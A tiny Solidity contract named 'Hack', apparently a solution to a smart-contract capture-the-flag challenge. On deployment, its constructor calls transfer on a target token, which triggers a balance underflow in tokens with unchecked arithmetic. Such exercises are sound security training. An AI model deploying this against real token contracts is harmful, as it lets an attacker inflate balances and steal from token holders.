// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool);
}

contract Hack {
    constructor(address _addr) {
        IToken(_addr).transfer(msg.sender, 1);
    }
}

